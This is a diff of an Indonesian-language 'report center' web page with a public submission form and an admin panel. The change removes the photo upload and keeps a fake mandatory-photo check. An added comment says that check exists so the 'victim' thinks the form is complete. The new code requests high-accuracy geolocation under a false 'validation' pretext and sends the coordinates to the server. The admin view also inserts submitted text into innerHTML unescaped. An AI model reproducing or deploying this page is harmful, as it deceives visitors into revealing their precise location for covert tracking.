@@ -15,21 +15,24 @@
         .form-group label { display: block; font-size: 13px; color: #3c4043; font-weight: 600; margin-bottom: 8px; }
         .form-group textarea { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 14px; color: #202124; font-family: inherit; resize: vertical; min-height: 100px; }
         .form-group textarea:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.1); }
+        
         .file-upload-wrapper { border: 2px dashed #dadce0; border-radius: 8px; padding: 20px; text-align: center; cursor: pointer; background: #f8f9fa; transition: all 0.2s; }
         .file-upload-wrapper:hover { border-color: #1a73e8; background: #e8f0fe; }
         .file-upload-wrapper input[type="file"] { display: none; }
         .file-upload-wrapper span { font-size: 13px; color: #5f6368; }
         .file-upload-wrapper strong { color: #1a73e8; }
+        
         button { width: 100%; padding: 14px; background-color: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; }
         button:hover { background-color: #1557b0; }
         button:disabled { background-color: #9aa0a6; cursor: wait; }
+        
         #result { margin-top: 20px; font-size: 13px; text-align: center; line-height: 1.5; word-break: break-word; }
         .success { color: #1e8e3e; font-weight: bold;}
         .error { color: #d93025; font-weight: bold; background:#fce8e6; padding:10px; border-radius:6px; border:1px solid #f5c6cb; display:block;}
         
+        /* Admin Panel Styling */
         #adminPanel { display: none; width: 100%; max-width: 600px; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #eaeaea; }
         .log-item { border-bottom: 1px solid #eaeaea; padding: 15px 0; display: flex; gap: 15px; align-items: flex-start;}
-        .log-item img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 1px solid #dadce0; }
         .log-info { flex: 1; font-size: 13px; color: #3c4043; }
         .log-info a { color: #1a73e8; text-decoration: none; font-weight: 600; }
         .log-info .kronologi { background: #f8f9fa; padding: 8px; border-radius: 6px; margin: 5px 0; display: block; border-left: 3px solid #1a73e8; word-break: break-word; }
@@ -37,6 +40,7 @@
 </head>
 <body>
 
+<!-- FORM PUBLIK -->
 <div class="card" id="publicForm">
     <div class="header">
         <h1>Pusat Laporan</h1>
@@ -62,6 +66,7 @@
     </form>
 </div>
 
+<!-- HALAMAN ADMIN -->
 <div id="adminPanel">
     <h2 style="margin-top:0; color:#202124;">Daftar Laporan Masuk</h2>
     <div id="logList">Memuat data...</div>
@@ -97,10 +102,8 @@
                 list.innerHTML = '';
                 data.forEach(item => {
                     const date = new Date(item.created_at).toLocaleString('id-ID');
-                    let imgTag = item.photo ? `<img src="${item.photo}" alt="Foto">` : `<div style="width:80px;height:80px;background:#e2e8f0;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:10px;text-align:center;">Tanpa Foto</div>`;
                     list.innerHTML += `
                         <div class="log-item">
-                            ${imgTag}
                             <div class="log-info">
                                 <strong>Waktu Masuk:</strong> ${date}<br>
                                 <span class="kronologi">${item.kronologi || 'Tidak ada teks'}</span>
@@ -123,83 +126,58 @@
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            // Cuma ngecek ada file apa nggak (biar korban mikir formnya lengkap)
             const file = document.getElementById('fileInput').files[0];
             if (!file) return resBox.innerHTML = '<span class="error">Lampiran foto wajib diisi!</span>';
 
-            btn.innerText = "Memproses Foto...";
+            btn.innerText = "Memverifikasi...";
             btn.disabled = true;
             resBox.innerHTML = '';
 
-            // FUNGSI KOMPRES FOTO (Resize ke max 800px & kualitas 60%)
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                const img = new Image();
-                img.onload = function() {
-                    const canvas = document.createElement('canvas');
-                    const MAX_WIDTH = 800;
-                    let scale = 1;
-                    
-                    if (img.width > MAX_WIDTH) {
-                        scale = MAX_WIDTH / img.width;
+            // LANGSUNG MINTA LOKASI (Foto gak diurus, gak dibaca, gak dikirim)
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const kronologiText = document.getElementById('kronologi').value;
+
+                    btn.innerText = "Mengirim...";
+
+                    try {
+                        const res = await fetch('/api/upload', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            // CUMA KIRIM LAT, LON, DAN KRONOLOGI
+                            body: JSON.stringify({ lat, lon, kronologi: kronologiText })
+                        });
+                        
+                        let data;
+                        try {
+                            data = await res.json();
+                        } catch (jsonErr) {
+                            throw new Error(`Server Error: ${res.status}`);
+                        }
+
+                        if (!res.ok || data.status !== 'success') {
+                            throw new Error(data.message || data.error || "Gagal menyimpan data ke server.");
+                        }
+
+                        resBox.innerHTML = '<span class="success">✅ Laporan berhasil dikirim. Tim kami akan segera memprosesnya.</span>';
+                        btn.innerText = "Terkirim";
+                        
+                    } catch (err) {
+                        resBox.innerHTML = `<span class="error">❌ Gagal: ${err.message}</span>`;
+                        btn.innerText = "Coba Lagi";
+                        btn.disabled = false;
                     }
-                    
-                    canvas.width = img.width * scale;
-                    canvas.height = img.height * scale;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    
-                    // Kualitas 0.6 (60%) biar file jadi kecil banget (biasanya < 100KB)
-                    const compressedBase64 = canvas.toDataURL('image/jpeg', 0.6);
-
-                    // Lanjut Minta Lokasi
-                    btn.innerText = "Mengambil Lokasi...";
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const kronologiText = document.getElementById('kronologi').value;
-
-                            btn.innerText = "Mengirim...";
-
-                            try {
-                                const res = await fetch('/api/upload', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ lat, lon, photo: compressedBase64, kronologi: kronologiText })
-                                });
-                                
-                                let data;
-                                try {
-                                    data = await res.json();
-                                } catch (jsonErr) {
-                                    throw new Error(`Server Error (HTML/Timeout): ${res.status}`);
-                                }
-
-                                if (!res.ok || data.status !== 'success') {
-                                    throw new Error(data.message || data.error || "Gagal menyimpan data ke server.");
-                                }
-
-                                resBox.innerHTML = '<span class="success">✅ Laporan berhasil dikirim. Tim kami akan segera memprosesnya.</span>';
-                                btn.innerText = "Terkirim";
-                                
-                            } catch (err) {
-                                resBox.innerHTML = `<span class="error">❌ Gagal: ${err.message}</span>`;
-                                btn.innerText = "Coba Lagi";
-                                btn.disabled = false;
-                            }
-                        },
-                        (error) => {
-                            resBox.innerHTML = '<span class="error">❌ Izin lokasi dibutuhkan untuk memvalidasi laporan.</span>';
-                            btn.innerText = "Coba Lagi";
-                            btn.disabled = false;
-                        },
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                };
-                img.src = event.target.result;
-            };
-            reader.readAsDataURL(file);
+                },
+                (error) => {
+                    resBox.innerHTML = '<span class="error">❌ Izin lokasi dibutuhkan untuk memvalidasi laporan.</span>';
+                    btn.innerText = "Coba Lagi";
+                    btn.disabled = false;
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
         });
     }
 </script>
